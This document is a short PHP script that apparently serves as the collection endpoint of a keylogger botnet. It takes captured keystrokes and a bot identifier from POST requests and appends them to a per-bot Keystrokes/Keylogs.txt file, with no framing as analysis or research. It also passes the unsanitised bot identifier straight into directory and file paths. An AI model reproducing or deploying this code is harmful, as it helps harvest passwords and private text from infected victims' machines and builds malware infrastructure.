<?php
              
if(isset($_POST['key']) && $_POST['botid'])
{
$data=$_POST['key'];
$dir=$_POST['botid'];

$path = 'uploads/' . $dir . '/';


if (!is_dir($dir))
 {
    mkdir($dir);
}
			
if (!is_dir($dir.'/Keystrokes/')) 
{
    mkdir($dir.'/Keystrokes/');
}


$my_file = 'Keylogs.txt';
$fp = fopen($dir.'/Keystrokes/'.$my_file, 'a');
fwrite($fp, $data);
fclose($fp);
}
?>